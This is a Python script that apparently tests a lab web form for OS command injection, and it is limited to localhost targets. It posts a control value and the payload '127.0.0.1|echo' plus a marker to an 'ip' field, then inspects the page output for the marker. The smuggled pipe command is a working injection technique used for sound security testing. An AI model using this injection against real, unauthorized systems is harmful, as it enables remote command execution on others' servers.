#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CMD-003 command-injection observation draft (local authorized lab only)."""

import argparse
import http.cookiejar
import re
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(
            req.full_url, code, "redirect refused: " + newurl, headers, fp
        )


def build_opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar), NoRedirect()
    )


def read_cookie_header(path):
    if not path:
        return None
    with open(path, "r", encoding="utf-8") as fh:
        for raw in fh:
            line = raw.strip()
            if line and not line.startswith("#"):
                return line
    return None


def fetch_token(opener, url, regex, timeout):
    req = urllib.request.Request(url, method="GET")
    with opener.open(req, timeout=timeout) as resp:
        body = resp.read().decode("utf-8", "replace")
    match = re.search(regex, body)
    if not match:
        raise SystemExit("token not found; token precondition failed")
    return match.group(1)


def post_form(opener, url, fields, cookie_header, timeout):
    data = urllib.parse.urlencode(fields).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    if cookie_header:
        req.add_header("Cookie", cookie_header)
    with opener.open(req, timeout=timeout) as resp:
        return resp.status, resp.geturl(), resp.read().decode("utf-8", "replace")


def pre_blocks(html):
    return [m.group(1) for m in re.finditer(r"<pre>(.*?)</pre>", html, re.S | re.I)]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", default="http://127.0.0.1")
    ap.add_argument("--path", required=True,
                    help="page path rendering the audited fragment (from deployment)")
    ap.add_argument("--cookie-file",
                    help="local file with one Cookie header line (never printed)")
    ap.add_argument("--token-regex",
                    help="optional regex (group 1) to refetch a fresh token per request")
    ap.add_argument("--token-field", default="user_token")
    ap.add_argument("--marker", default="CMDINJ_MARK_01")
    ap.add_argument("--timeout", type=float, default=10.0)
    args = ap.parse_args()

    parsed = urllib.parse.urlsplit(args.base_url)
    if parsed.scheme not in ("http", "https") or (parsed.hostname or "") not in ALLOWED_HOSTS:
        raise SystemExit("refusing non-local target: %s" % args.base_url)
    url = args.base_url.rstrip("/") + "/" + args.path.lstrip("/")

    opener = build_opener()
    cookie_header = read_cookie_header(args.cookie_file)
    cases = [("control", "127.0.0.1"),
             ("test", "127.0.0.1|echo " + args.marker)]

    for label, ip_value in cases:
        token = None
        if args.token_regex:
            token = fetch_token(opener, url, args.token_regex, args.timeout)
        fields = {"Submit": "Submit", "ip": ip_value}
        if token:
            fields[args.token_field] = token
        try:
            status, final_url, html = post_form(
                opener, url, fields, cookie_header, args.timeout)
        except urllib.error.HTTPError as exc:
            print("[%s] HTTP error %s %s" % (label, exc.code, exc.reason))
            continue
        except (urllib.error.URLError, OSError) as exc:
            print("[%s] connection/protocol error: %s" % (label, exc))
            continue
        blocks = pre_blocks(html)
        region = "\n".join(blocks)
        print("[%s] status=%s final_url=%s pre_blocks=%d" %
              (label, status, final_url, len(blocks)))
        print("[%s] <pre> region >>>" % label)
        print(region if region else "(no <pre> block found)")
        print("<<< <pre> region")
        lines = [ln.strip() for ln in region.splitlines()]
        own_line = args.marker in lines
        embedded = (args.marker in region) and not own_line
        print("[%s] marker_own_line=%s marker_embedded_only=%s" %
              (label, own_line, embedded))
        ping_seen = bool(re.search(
            r"(bytes from|Reply from|ttl[=:]|time[=<]|Packets: Sent)", region, re.I))
        print("[%s] ping_output_seen=%s" % (label, ping_seen))


if __name__ == "__main__":
    main()
